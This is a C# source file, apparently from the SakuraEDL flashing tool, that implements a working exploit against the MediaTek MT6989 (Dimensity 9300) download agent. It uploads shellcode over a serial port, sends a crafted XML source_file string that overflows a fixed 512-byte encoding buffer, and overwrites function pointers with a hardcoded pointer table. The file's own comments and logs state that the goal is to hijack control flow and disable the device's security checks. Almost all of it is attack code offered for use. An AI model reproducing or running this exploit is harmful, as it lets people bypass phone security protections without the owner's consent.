// ============================================================================
// SakuraEDL - AllinoneSignature Exploit | AllinoneSignature 漏洞利用
// ============================================================================
// [ZH] AllinoneSignature 漏洞 - MT6989 缓冲区溢出 (天玑 9300)
// [EN] AllinoneSignature Exploit - MT6989 buffer overflow (Dimensity 9300)
// [JA] AllinoneSignatureエクスプロイト - MT6989バッファオーバーフロー
// [KO] AllinoneSignature 익스플로잇 - MT6989 버퍼 오버플로우
// [RU] Эксплойт AllinoneSignature - Переполнение буфера MT6989
// [ES] Exploit AllinoneSignature - Desbordamiento de búfer MT6989
// ============================================================================
// Vulnerability: DA2 sub_34C58 heap buffer overflow (512-byte fixed buffer)
// Copyright (c) 2025-2026 SakuraEDL | Licensed under CC BY-NC-SA 4.0
// ============================================================================

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Ports;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using SakuraEDL.MediaTek.Common;

namespace SakuraEDL.MediaTek.Exploit
{
    /// <summary>
    /// MT6989 ALLINONE-SIGNATURE 漏洞利用
    /// 
    /// 漏洞原理:
    /// 1. DA2 的 sub_34C58 函数将 source_file 字符串编码为 XML 实体
    /// 2. 编码使用固定 512 字节缓冲区 (MEMORY[0x968B0])
    /// 3. 编码扩展: & → &amp; (1:5), < → &lt; (1:4), > → &gt; (1:4)
    /// 4. 如果 source_file 包含大量特殊字符, 编码后超过 512 字节导致溢出
    /// 
    /// 利用流程:
    /// Phase 1: 发送 CMD:SECURITY-SET-ALLINONE-SIGNATURE, 上传 shellcode (1.85MB)
    /// Phase 2: 发送恶意 source_file 触发溢出, 同时发送指针表覆盖函数指针
    /// Phase 3: 控制流被劫持到 shellcode, 禁用安全检查
    /// </summary>
    public class AllinoneSignatureExploit : IDisposable
    {
        private SerialPort _port;
        private readonly Action<string> _log;
        private readonly Action<string> _logDetail;
        private readonly Action<double> _progressCallback;
        private readonly SemaphoreSlim _portLock;
        private bool _disposed;

        // XML 协议常量
        private const uint XML_MAGIC = 0xFEEEEEEF;
        private const int DEFAULT_TIMEOUT_MS = 30000;

        // DA2 内存布局 (MT6989, 基址 0x40000000)
        private const uint DA2_BASE_ADDRESS = 0x40000000;
        private const uint SHELLCODE_STORAGE_OFFSET = 0x96DA0;  // allinone_signature 存储位置
        private const uint XML_ENCODE_BUFFER_OFFSET = 0x968B0;  // 512 字节溢出缓冲区

        // 数据类型 (根据 mtkclient xml_param.py 修正)
        // mtkclient: DT_PROTOCOL_FLOW = 1, DT_MESSAGE = 2
        private enum DataType : uint
        {
            /// <summary>协议流数据 - DT_PROTOCOL_FLOW</summary>
            ProtocolFlow = 1,
            /// <summary>协议响应</summary>
            ProtocolResponse = 1,
            /// <summary>原始数据/消息 - DT_MESSAGE</summary>
            ProtocolRaw = 2
        }

        public AllinoneSignatureExploit(
            SerialPort port,
            Action<string> log = null,
            Action<string> logDetail = null,
            Action<double> progressCallback = null,
            SemaphoreSlim portLock = null)
        {
            _port = port ?? throw new ArgumentNullException(nameof(port));
            _log = log ?? delegate { };
            _logDetail = logDetail ?? _log;
            _progressCallback = progressCallback;
            _portLock = portLock ?? new SemaphoreSlim(1, 1);
        }

        /// <summary>
        /// 设置串口
        /// </summary>
        public void SetPort(SerialPort port)
        {
            _port = port;
        }

        #region 主要漏洞利用入口

        /// <summary>
        /// 执行完整的漏洞利用
        /// </summary>
        /// <param name="shellcode">Shellcode 数据 (约 1.85MB)</param>
        /// <param name="pointerTable">指针表数据 (约 9KB)</param>
        /// <param name="ct">取消令牌</param>
        /// <returns>是否成功</returns>
        public async Task<bool> ExecuteExploitAsync(
            byte[] shellcode,
            byte[] pointerTable,
            CancellationToken ct = default)
        {
            _log("[Exploit] ========================================");
            _log("[Exploit] MT6989 ALLINONE-SIGNATURE Exploit");
            _log("[Exploit] ========================================");

            try
            {
                // Phase 1: 上传 Shellcode
                _log("[Exploit] Phase 1: 上传 Shellcode...");
                if (!await UploadShellcodeAsync(shellcode, ct))
                {
                    _log("[Exploit] ✗ Phase 1 失败: Shellcode 上传失败");
                    return false;
                }
                _log("[Exploit] ✓ Phase 1 完成: Shellcode 已上传");

                // 等待一下让 DA2 处理
                await Task.Delay(100, ct);

                // Phase 2: 触发溢出
                _log("[Exploit] Phase 2: 触发缓冲区溢出...");
                if (!await TriggerOverflowAsync(pointerTable, ct))
                {
                    _log("[Exploit] ✗ Phase 2 失败: 溢出触发失败");
                    return false;
                }
                _log("[Exploit] ✓ Phase 2 完成: 溢出已触发");

                // Phase 3: 验证
                _log("[Exploit] Phase 3: 验证 exploit 效果...");
                await Task.Delay(200, ct);
                
                bool success = await VerifyExploitAsync(ct);
                if (success)
                {
                    _log("[Exploit] ✓ Phase 3 完成: Exploit 成功!");
                    _log("[Exploit] ========================================");
                    _log("[Exploit] 设备安全检查已禁用");
                    _log("[Exploit] ========================================");
                }
                else
                {
                    _log("[Exploit] ⚠ Phase 3: 无法验证, 但可能已成功");
                }

                return true;
            }
            catch (Exception ex)
            {
                _log($"[Exploit] 异常: {ex.Message}");
                _logDetail($"[Exploit] 堆栈: {ex.StackTrace}");
                return false;
            }
        }

        /// <summary>
        /// 使用默认 shellcode 和指针表执行漏洞利用
        /// </summary>
        public async Task<bool> ExecuteExploitAsync(CancellationToken ct = default)
        {
            // 加载指针表 (all in one sign.bin 实际上是指针表)
            byte[] pointerTable = await LoadPointerTableAsync(ct);
            if (pointerTable == null || pointerTable.Length == 0)
            {
                _log("[Exploit] 错误: 无法加载指针表");
                _log("[Exploit] 请确保 'all in one sign.bin' 或 'pointer_table.bin' 文件存在");
                return false;
            }

            // 加载触发器 source_file
            string sourceFileTrigger = await LoadSourceFileTriggerAsync(ct);
            if (string.IsNullOrEmpty(sourceFileTrigger))
            {
                _log("[Exploit] 警告: 未找到 source_file_trigger.txt, 使用生成的触发器");
                sourceFileTrigger = GenerateMaliciousSourceFile();
            }

            return await ExecuteSinglePhaseExploitAsync(sourceFileTrigger, pointerTable, ct);
        }

        /// <summary>
        /// 加载指针表文件
        /// </summary>
        private async Task<byte[]> LoadPointerTableAsync(CancellationToken ct)
        {
            string[] possiblePaths = new[]
            {
                "all in one sign.bin",
                @"MediaTek\Loader\all in one sign.bin",
                "pointer_table.bin",
                @"MediaTek\Loader\pointer_table.bin",
            };

            foreach (var path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    _log($"[Exploit] 从 {path} 加载指针表");
                    byte[] data = await Task.Run(() => File.ReadAllBytes(path), ct);
                    _log($"[Exploit] 指针表大小: {data.Length} 字节");
                    return data;
                }
            }

            _log("[Exploit] 未找到指针表文件");
            return null;
        }

        /// <summary>
        /// 加载 source_file 触发器
        /// </summary>
        private async Task<string> LoadSourceFileTriggerAsync(CancellationToken ct)
        {
            string[] possiblePaths = new[]
            {
                "source_file_trigger.txt",
                @"MediaTek\Loader\source_file_trigger.txt",
            };

            foreach (var path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    _log($"[Exploit] 从 {path} 加载触发器");
                    return await Task.Run(() => File.ReadAllText(path), ct);
                }
            }

            return null;
        }

        /// <summary>
        /// 单阶段漏洞利用 (匹配 ChimeraTool 协议)
        /// </summary>
        private async Task<bool> ExecuteSinglePhaseExploitAsync(string sourceFileTrigger, byte[] pointerTable, CancellationToken ct)
        {
            _log("[Exploit] === 开始 AllinoneSignature 漏洞利用 ===");
            _log($"[Exploit] source_file 长度: {sourceFileTrigger.Length} 字符");
            _log($"[Exploit] 指针表大小: {pointerTable.Length} 字节");

            // 构建 XML 命令 (使用恶意 source_file)
            string xmlCmd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                           "<da>" +
                           "<version>1.0</version>" +
                           "<command>CMD:SECURITY-SET-ALLINONE-SIGNATURE</command>" +
                           "<arg>" +
                           $"<source_file>{sourceFileTrigger}</source_file>" +
                           "</arg>" +
                           "</da>";

            await _portLock.WaitAsync(ct);
            try
            {
                // Step 1: 发送恶意 XML 命令
                _log("[Exploit] Step 1: 发送 CMD:SECURITY-SET-ALLINONE-SIGNATURE");
                await SendXmlAsync(xmlCmd, ct);
                _logDetail($"[Exploit] XML 命令长度: {xmlCmd.Length} 字节");

                // Step 2: 等待设备响应
                // 设备会先返回 OK，然后发送 CMD:DOWNLOAD-FILE
                await Task.Delay(100, ct);

                _log("[Exploit] Step 2: 等待设备响应...");
                
                // 循环读取直到收到 CMD:DOWNLOAD-FILE 或超时
                string downloadFileResponse = null;
                int maxAttempts = 10;
                for (int attempt = 0; attempt < maxAttempts; attempt++)
                {
                    string response = await ReceiveXmlAsync(3000, ct);
                    if (response == null)
                    {
                        _logDetail($"[Exploit] 尝试 {attempt + 1}: 无响应");
                        continue;
                    }

                    _logDetail($"[Exploit] 尝试 {attempt + 1}: {(response.Length > 100 ? response.Substring(0, 100) + "..." : response)}");

                    if (response.Contains("CMD:DOWNLOAD-FILE"))
                    {
                        downloadFileResponse = response;
                        _log("[Exploit] ✓ 收到 CMD:DOWNLOAD-FILE 请求");
                        break;
                    }
                    else if (response == "OK" || response.StartsWith("OK"))
                    {
                        _logDetail("[Exploit] 收到 OK 确认，继续等待 DOWNLOAD-FILE...");
                        continue;
                    }
                    else if (response.Contains("ERR"))
                    {
                        _log($"[Exploit] 设备返回错误: {response}");
                        return false;
                    }
                }

                if (downloadFileResponse == null)
                {
                    _log("[Exploit] 未收到 DOWNLOAD-FILE 请求");
                    return false;
                }

                // Step 4: 发送 OK 确认 (确认收到 DOWNLOAD-FILE)
                _log("[Exploit] Step 3: 发送 OK 确认");
                await SendOkAsync(ct);

                // Step 5: 发送 OK@size
                string okSize = $"OK@{pointerTable.Length} ";
                _log($"[Exploit] Step 4: 发送 {okSize.Trim()}");
                await SendXmlDataAsync(okSize, ct);

                // Step 6: 等待设备 OK 确认
                _log("[Exploit] Step 5: 等待设备确认...");
                try
                {
                    await WaitForOkAsync(ct);
                    _logDetail("[Exploit] 收到设备确认");
                }
                catch
                {
                    _logDetail("[Exploit] 等待确认超时，继续...");
                }

                // Step 7: 发送第二次 OK (按 ChimeraTool 流程)
                _log("[Exploit] Step 5b: 发送 OK 确认...");
                try
                {
                    await SendOkAsync(ct);
                    _logDetail("[Exploit] ✓ OK 已发送");
                }
                catch (Exception ex)
                {
                    _log($"[Exploit] 发送 OK 异常: {ex.Message}");
                    // 如果发送失败，设备可能已经断开，但继续尝试
                }

                // Step 8: 等待设备第二次 OK 确认
                _log("[Exploit] Step 5c: 等待第二次确认...");
                try
                {
                    await WaitForOkAsync(ct);
                    _logDetail("[Exploit] ✓ 收到第二次确认");
                }
                catch
                {
                    _log("[Exploit] ⚠ 等待第二次确认超时，继续发送数据...");
                }

                // 等待设备稳定
                await Task.Delay(50, ct);

                // Step 9: 发送指针表数据 (使用 XML 数据类型)
                _log($"[Exploit] Step 6: 发送指针表 ({pointerTable.Length} 字节)...");
                await SendSignatureDataAsync(pointerTable, ct);

                // Step 8: 等待设备处理
                await Task.Delay(500, ct);

                // 读取设备响应
                string finalResponse = await ReceiveXmlAsync(5000, ct);
                _logDetail($"[Exploit] 最终响应: {finalResponse ?? "null"}");

                _log("[Exploit] === AllinoneSignature 漏洞利用完成 ===");
                return true;
            }
            catch (Exception ex)
            {
                _log($"[Exploit] 异常: {ex.Message}");
                return false;
            }
            finally
            {
                _portLock.Release();
            }
        }

        /// <summary>
        /// 发送 OK 确认
        /// </summary>
        private async Task SendOkAsync(CancellationToken ct)
        {
            // 发送 header + "OK"
            byte[] header = new byte[12];
            BitConverter.GetBytes(XML_MAGIC).CopyTo(header, 0);
            BitConverter.GetBytes(1).CopyTo(header, 4);  // dataType = 1
            BitConverter.GetBytes(2).CopyTo(header, 8);  // length = 2

            byte[] ok = Encoding.ASCII.GetBytes("OK");

            _port.Write(header, 0, header.Length);
            _port.Write(ok, 0, ok.Length);
            _port.BaseStream.Flush();
            await Task.Delay(10, ct);
        }

        /// <summary>
        /// 发送 XML 数据 (带 header)
        /// </summary>
        private async Task SendXmlDataAsync(string data, CancellationToken ct)
        {
            byte[] dataBytes = Encoding.ASCII.GetBytes(data);
            
            byte[] header = new byte[12];
            BitConverter.GetBytes(XML_MAGIC).CopyTo(header, 0);
            BitConverter.GetBytes(1).CopyTo(header, 4);  // dataType = 1 (XML)
            BitConverter.GetBytes(dataBytes.Length).CopyTo(header, 8);

            _port.Write(header, 0, header.Length);
            _port.BaseStream.Flush();
            await Task.Delay(5, ct);
            
            _port.Write(dataBytes, 0, dataBytes.Length);
            _port.BaseStream.Flush();
            await Task.Delay(10, ct);
        }

        /// <summary>
        /// 发送 Signature 数据 (按 ChimeraTool 方式 - 一次性发送)
        /// </summary>
        private async Task SendSignatureDataAsync(byte[] data, CancellationToken ct)
        {
            // ChimeraTool 发送方式:
            // 1. 发送 header (magic + type=1 + length) - 单独的 USB 事务
            // 2. 发送数据 - 单独的 USB 事务
            
            _logDetail($"[Exploit] 发送 header: magic=0x{XML_MAGIC:X8}, type=1, length={data.Length}");
            
            // 发送 header (12 字节)
            byte[] header = new byte[12];
            BitConverter.GetBytes(XML_MAGIC).CopyTo(header, 0);
            BitConverter.GetBytes(1).CopyTo(header, 4);  // dataType = 1 (XML)
            BitConverter.GetBytes(data.Length).CopyTo(header, 8);
            
            try
            {
                _port.Write(header, 0, header.Length);
                _port.BaseStream.Flush();
            }
            catch (Exception ex)
            {
                _log($"[Exploit] Header 发送失败: {ex.Message}");
                throw;
            }

            // 等待确保 header 发送完成
            await Task.Delay(50, ct);

            // 发送数据
            try
            {
                _port.Write(data, 0, data.Length);
                _port.BaseStream.Flush();
            }
            catch (Exception ex)
            {
                _log($"[Exploit] 数据发送失败: {ex.Message}");
                throw;
            }

            _log($"[Exploit] 指针表发送完成: {data.Length} 字节");
            _progressCallback?.Invoke(100);
            
            // 等待设备处理
            await Task.Delay(100, ct);
        }

        #endregion

        #region Phase 1: 上传 Shellcode

        /// <summary>
        /// Phase 1: 上传 Shellcode 到 DA2 内存
        /// </summary>
        private async Task<bool> UploadShellcodeAsync(byte[] shellcode, CancellationToken ct)
        {
            _log($"[Phase1] Shellcode 大小: {shellcode.Length} 字节");

            // 发送 CMD:SECURITY-SET-ALLINONE-SIGNATURE 命令
            string xmlCmd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                           "<da>" +
                           "<version>1.0</version>" +
                           "<command>CMD:SECURITY-SET-ALLINONE-SIGNATURE</command>" +
                           "<arg>" +
                           "<source_file>allinone_signature</source_file>" +
                           "</arg>" +
                           "</da>";

            await _portLock.WaitAsync(ct);
            try
            {
                // 发送 XML 命令
                await SendXmlAsync(xmlCmd, ct);

                // 等待 DA2 响应 CMD:DOWNLOAD-FILE
                string response = await ReceiveXmlAsync(10000, ct);
                if (response == null || !response.Contains("CMD:DOWNLOAD-FILE"))
                {
                    _log("[Phase1] 未收到 DOWNLOAD-FILE 请求");
                    _logDetail($"[Phase1] 响应: {response ?? "null"}");
                    return false;
                }

                _logDetail("[Phase1] 收到 DOWNLOAD-FILE 请求");

                // 发送 OK@size 确认
                string okResponse = $"OK@{shellcode.Length}";
                await SendXmlAsync(okResponse, ct);
                _logDetail($"[Phase1] 发送: {okResponse}");

                // 等待 OK 确认
                await WaitForOkAsync(ct);

                // 发送 shellcode 数据
                _log("[Phase1] 开始发送 shellcode 数据...");
                await SendRawDataAsync(shellcode, ct);

                // 等待 CMD:END
                response = await ReceiveXmlAsync(10000, ct);
                if (response != null && response.Contains("result") && response.Contains("OK"))
                {
                    _log("[Phase1] ✓ Shellcode 上传成功");
                    return true;
                }

                // 即使返回 ERR 也可能成功 (shellcode 已存储)
                _log("[Phase1] 响应非 OK, 但 shellcode 可能已存储");
                return true;
            }
            finally
            {
                _portLock.Release();
            }
        }

        #endregion

        #region Phase 2: 触发溢出

        /// <summary>
        /// Phase 2: 发送恶意 source_file 触发缓冲区溢出
        /// </summary>
        private async Task<bool> TriggerOverflowAsync(byte[] pointerTable, CancellationToken ct)
        {
            // 生成恶意 source_file
            // 目标: 让 XML 编码后超过 512 字节, 触发溢出
            // 策略: 使用大量 ';' 和 XML 实体 (&amp;, &gt;, &lt;, &quot;)
            string maliciousSourceFile = GenerateMaliciousSourceFile();
            
            _log($"[Phase2] 恶意 source_file 长度: {maliciousSourceFile.Length} 字符");

            string xmlCmd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                           "<da>" +
                           "<version>1.0</version>" +
                           "<command>CMD:SECURITY-SET-ALLINONE-SIGNATURE</command>" +
                           "<arg>" +
                           $"<source_file>{maliciousSourceFile}</source_file>" +
                           "</arg>" +
                           "</da>";

            await _portLock.WaitAsync(ct);
            try
            {
                // 发送恶意 XML 命令
                await SendXmlAsync(xmlCmd, ct);
                _logDetail($"[Phase2] 发送恶意命令, 总长度: {xmlCmd.Length} 字节");

                // 等待 DA2 响应 CMD:DOWNLOAD-FILE
                string response = await ReceiveXmlAsync(10000, ct);
                if (response == null || !response.Contains("CMD:DOWNLOAD-FILE"))
                {
                    _log("[Phase2] 未收到 DOWNLOAD-FILE 请求");
                    return false;
                }

                // 发送 OK@size (使用指针表大小)
                // 注意: DA2 可能会返回不同的大小, 但我们总是发送 9232 字节
                string okResponse = $"OK@{pointerTable.Length}";
                await SendXmlAsync(okResponse, ct);
                _logDetail($"[Phase2] 发送: {okResponse}");

                // 等待 OK 确认
                await WaitForOkAsync(ct);

                // 发送指针表数据 (这将覆盖函数指针)
                _log($"[Phase2] 发送指针表: {pointerTable.Length} 字节");
                await SendRawDataAsync(pointerTable, ct);

                // DA2 会返回 ERR (预期行为)
                response = await ReceiveXmlAsync(5000, ct);
                _logDetail($"[Phase2] 响应: {response ?? "null"}");

                // ERR 是预期的, 因为我们故意发送了无效数据
                _log("[Phase2] ✓ 溢出触发完成");
                return true;
            }
            finally
            {
                _portLock.Release();
            }
        }

        /// <summary>
        /// 生成恶意 source_file 字符串
        /// 目标: 让 sub_34C58 编码后超过 512 字节
        /// </summary>
        private string GenerateMaliciousSourceFile()
        {
            var sb = new StringBuilder();
            var random = new Random(42);  // 使用固定种子以保持一致性

            // 基础模式: 分号 + XML 实体
            string[] entities = { "&amp;", "&gt;", "&lt;", "&quot;" };
            
            // 生成约 5000 字符的恶意字符串
            // 编码后会远超 512 字节
            for (int i = 0; i < 1200; i++)
            {
                // 添加一些分号
                sb.Append(';');
                
                // 随机添加实体
                if (i % 4 == 0)
                {
                    sb.Append(entities[random.Next(entities.Length)]);
                }
            }

            return sb.ToString();
        }

        #endregion

        #region Phase 3: 验证

        /// <summary>
        /// Phase 3: 验证 exploit 是否成功
        /// </summary>
        private async Task<bool> VerifyExploitAsync(CancellationToken ct)
        {
            try
            {
                // 发送 GET-DEV-FW-INFO 命令测试
                string xmlCmd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                               "<da>" +
                               "<version>1.0</version>" +
                               "<command>CMD:SECURITY-GET-DEV-FW-INFO</command>" +
                               "<arg><target_file>DEV-FW-INFO</target_file></arg>" +
                               "</da>";

                await _portLock.WaitAsync(ct);
                try
                {
                    await SendXmlAsync(xmlCmd, ct);
                    string response = await ReceiveXmlAsync(5000, ct);

                    if (response != null && response.Contains("UPLOAD-FILE"))
                    {
                        _log("[Phase3] ✓ 设备响应正常, exploit 成功");
                        return true;
                    }

                    return false;
                }
                finally
                {
                    _portLock.Release();
                }
            }
            catch
            {
                return false;
            }
        }

        #endregion

        #region 指针表生成

        /// <summary>
        /// 生成默认指针表
        /// 这些地址指向 DA2 内存中的函数/数据, 用于劫持控制流
        /// 数据来源: ChimeraTool MT6989 抓包 (9232 字节 = 1154 个 64 位指针)
        /// </summary>
        public byte[] GenerateDefaultPointerTable()
        {
            // 从 ChimeraTool 抓包中提取的完整指针地址
            // MT6989 DA2 基址: 0x40000000
            ulong[] pointers = new ulong[]
            {
                // 第一批核心指针 (控制流劫持目标)
                0x40076CDC, 0x4006D428, 0x4004F1F8, 0x4006DF10,
                0x400389B8, 0x40026D80, 0x4007DBF8, 0x4008173C,
                0x40062F64, 0x4004283C, 0x4001A854, 0x400545B4,
                0x40042C04, 0x40072A2C, 0x40043D18, 0x4003BC54,
                0x40041D04, 0x400531B8, 0x400312DC, 0x40006B44,
                0x4000E254, 0x4007ACFC, 0x4000D51C, 0x40000818,
                0x40061FBC, 0x40016654, 0x400454C8, 0x400749DC,
                0x40078930, 0x40030FF0, 0x400214E0, 0x4002B304,
                0x400663CC, 0x4000CCE4, 0x40050BD8, 0x4007D2E8,
                0x40005428, 0x4004CD80, 0x4006AE1C, 0x40046A70,
                0x4002419C, 0x40003898, 0x40026BE4, 0x40046244,
                0x40080EF0, 0x40046E64, 0x4006BA9C, 0x40056DB0,
                0x40063E10, 0x4004A6CC, 0x40038C00, 0x400835D4,
                0x4006AABC, 0x40084F50, 0x4006B900, 0x400850D4,
                0x40081EF8, 0x40050268, 0x40049F9C, 0x4005B800,
                0x40084758, 0x400600B8, 0x40087250, 0x4000F0C4,
                0x4000F7D4, 0x400478F4, 0x40079DC4, 0x40081E74,
                0x400532C0, 0x40006214, 0x40051E7C, 0x4006B850,
                0x40068F10, 0x40017C94, 0x40026D08, 0x40068664,
                0x4002A914, 0x40044EEC, 0x400351E0, 0x40022AB0,
                0x400473A4, 0x4006B7B0, 0x40081E14, 0x40031A60,
                0x400494D8, 0x400252A4, 0x40014D28, 0x4006EF94,
                0x4005BE40, 0x40001E2C, 0x400429F0, 0x40060EF4,
                0x40060134, 0x4004D5A8, 0x4001B804, 0x40049CB8,
                0x4001F5A0, 0x4000CA48, 0x4000BE50, 0x4003BA08,
                0x40064C58, 0x4001CEA4, 0x40010460, 0x4000B720,
                0x4003BA34, 0x40022D5C, 0x4004EAEC, 0x40024248,
                0x40077CB0, 0x4005FF04, 0x400376E0, 0x4002F8B4,
                0x40034520, 0x400591C0, 0x40038FC8, 0x40015DEC,
                0x40021D58, 0x4000C5BC, 0x40030004, 0x40020568,
                0x4003FCA4, 0x40087104, 0x4007FCCC, 0x4001D5A0,
                0x4002BDAC, 0x4004261C, 0x40077878, 0x40069CDC,
                0x4003B650, 0x4001C468, 0x40052118, 0x4007FEE8,
                0x40081648, 0x400247A8, 0x400248E0, 0x40025DC0,
                0x4002CB9C, 0x40081988, 0x40076DC4, 0x4003C544,
                0x40088A04, 0x40078DF8, 0x4005B984, 0x400596B0,
                0x400813F4, 0x40077AAC, 0x40086A28, 0x40035040,
                0x4005F42C, 0x4006C1CC, 0x4003FB10, 0x400598D0,
                0x40068686, 0x40039180, 0x40001ED0, 0x4001B594,
                0x4000E02C, 0x40040578, 0x40080C10, 0x40064F88,
                0x4000BC50, 0x40060D24, 0x4003C818, 0x40002BD4,
                0x40068D10, 0x4003465C, 0x4001A1A4, 0x40035EAC,
                0x40068734, 0x40051C00, 0x40045258, 0x4000F9D0,
                0x40009638, 0x4004ED34, 0x40058608, 0x4003A9CC,
                0x40031D2C, 0x40004B38, 0x40008504, 0x4007BF50,
                0x4005DB5C, 0x4006CBF8, 0x40058F34, 0x40043B94,
                0x40002DE0, 0x4004B5D8, 0x400392EC, 0x40020558,
                0x40068044, 0x40056A58, 0x4002F224, 0x40064F68,
            };

            // 生成完整的 9232 字节指针表
            int totalPointers = 1154;  // 9232 / 8
            byte[] result = new byte[totalPointers * 8];
            
            for (int i = 0; i < totalPointers; i++)
            {
                // 循环使用已知指针填充
                ulong ptr = pointers[i % pointers.Length];
                WriteUInt64LE(result, i * 8, ptr);
            }

            _logDetail($"[PointerTable] 生成 {result.Length} 字节指针表 ({totalPointers} 个指针)");
            return result;
        }

        /// <summary>
        /// 从文件加载指针表
        /// </summary>
        public byte[] LoadPointerTableFromFile(string filePath)
        {
            if (File.Exists(filePath))
            {
                return File.ReadAllBytes(filePath);
            }
            return null;
        }

        #endregion

        #region Shellcode 加载

        /// <summary>
        /// 加载 Shellcode
        /// </summary>
        private async Task<byte[]> LoadShellcodeAsync(CancellationToken ct)
        {
            // 尝试从多个位置加载
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string[] possiblePaths = new[]
            {
                "all in one sign.bin",
                Path.Combine(baseDir, "all in one sign.bin"),
                Path.Combine(baseDir, "MediaTek", "Loader", "all in one sign.bin"),
                Path.Combine(baseDir, "Payloads", "all in one sign.bin"),
                Path.Combine(baseDir, "MtkPayloads", "all in one sign.bin")
            };

            foreach (var path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    _log($"[Shellcode] 从 {path} 加载");
                    return await Task.Run(() => File.ReadAllBytes(path), ct);
                }
            }

            _log("[Shellcode] 未找到 shellcode 文件");
            return null;
        }

        #endregion

        #region XML 协议通信

        /// <summary>
        /// 发送 XML 数据
        /// </summary>
        private async Task SendXmlAsync(string xmlData, CancellationToken ct)
        {
            byte[] data = Encoding.UTF8.GetBytes(xmlData);

            // 构建头部: Magic (4) + DataType (4) + Length (4)
            byte[] header = new byte[12];
            MtkDataPacker.WriteUInt32LE(header, 0, XML_MAGIC);
            MtkDataPacker.WriteUInt32LE(header, 4, (uint)DataType.ProtocolFlow);
            MtkDataPacker.WriteUInt32LE(header, 8, (uint)data.Length);

            _port.Write(header, 0, 12);
            _port.Write(data, 0, data.Length);
        }

        /// <summary>
        /// 接收 XML 响应
        /// </summary>
        private async Task<string> ReceiveXmlAsync(int timeoutMs, CancellationToken ct)
        {
            // 读取头部
            byte[] header = await ReadBytesAsync(12, timeoutMs, ct);
            if (header == null)
                return null;

            uint magic = MtkDataPacker.UnpackUInt32LE(header, 0);
            if (magic != XML_MAGIC)
            {
                _logDetail($"[XML] 魔数不匹配: 0x{magic:X8}");
                return null;
            }

            uint length = MtkDataPacker.UnpackUInt32LE(header, 8);
            if (length == 0 || length > 65536)
                return null;

            byte[] data = await ReadBytesAsync((int)length, timeoutMs, ct);
            if (data == null)
                return null;

            return Encoding.UTF8.GetString(data);
        }

        /// <summary>
        /// 发送原始数据
        /// </summary>
        private async Task SendRawDataAsync(byte[] data, CancellationToken ct)
        {
            // 发送数据头
            byte[] header = new byte[12];
            MtkDataPacker.WriteUInt32LE(header, 0, XML_MAGIC);
            MtkDataPacker.WriteUInt32LE(header, 4, (uint)DataType.ProtocolRaw);
            MtkDataPacker.WriteUInt32LE(header, 8, (uint)data.Length);
            _port.Write(header, 0, 12);

            // 分块发送数据
            int chunkSize = 4096;
            int offset = 0;
            while (offset < data.Length)
            {
                if (ct.IsCancellationRequested)
                    break;

                int toSend = Math.Min(chunkSize, data.Length - offset);
                _port.Write(data, offset, toSend);
                offset += toSend;

                _progressCallback?.Invoke((double)offset * 100 / data.Length);
                
                // 小延迟防止溢出
                if (offset % 32768 == 0)
                    await Task.Delay(1, ct);
            }
        }

        /// <summary>
        /// 等待 OK 响应
        /// </summary>
        private async Task WaitForOkAsync(CancellationToken ct)
        {
            byte[] response = await ReadBytesAsync(12 + 3, 5000, ct);
            // OK\0 或其他响应都接受
        }

        /// <summary>
        /// 读取指定字节数
        /// </summary>
        private async Task<byte[]> ReadBytesAsync(int count, int timeoutMs, CancellationToken ct)
        {
            byte[] buffer = new byte[count];
            int read = 0;
            DateTime start = DateTime.Now;

            while (read < count)
            {
                if (ct.IsCancellationRequested)
                    return null;

                if ((DateTime.Now - start).TotalMilliseconds > timeoutMs)
                    return read > 0 ? TrimBuffer(buffer, read) : null;

                if (_port.BytesToRead > 0)
                {
                    int toRead = Math.Min(_port.BytesToRead, count - read);
                    int actualRead = _port.Read(buffer, read, toRead);
                    read += actualRead;
                }
                else
                {
                    await Task.Delay(10, ct);
                }
            }

            return buffer;
        }

        private byte[] TrimBuffer(byte[] buffer, int length)
        {
            byte[] result = new byte[length];
            Array.Copy(buffer, result, length);
            return result;
        }

        #endregion

        #region 辅助方法

        /// <summary>
        /// 写入 64 位无符号整数 (Little-Endian)
        /// </summary>
        private static void WriteUInt64LE(byte[] buffer, int offset, ulong value)
        {
            buffer[offset] = (byte)value;
            buffer[offset + 1] = (byte)(value >> 8);
            buffer[offset + 2] = (byte)(value >> 16);
            buffer[offset + 3] = (byte)(value >> 24);
            buffer[offset + 4] = (byte)(value >> 32);
            buffer[offset + 5] = (byte)(value >> 40);
            buffer[offset + 6] = (byte)(value >> 48);
            buffer[offset + 7] = (byte)(value >> 56);
        }

        #endregion

        #region IDisposable

        public void Dispose()
        {
            if (!_disposed)
            {
                _disposed = true;
            }
        }

        #endregion
    }
}
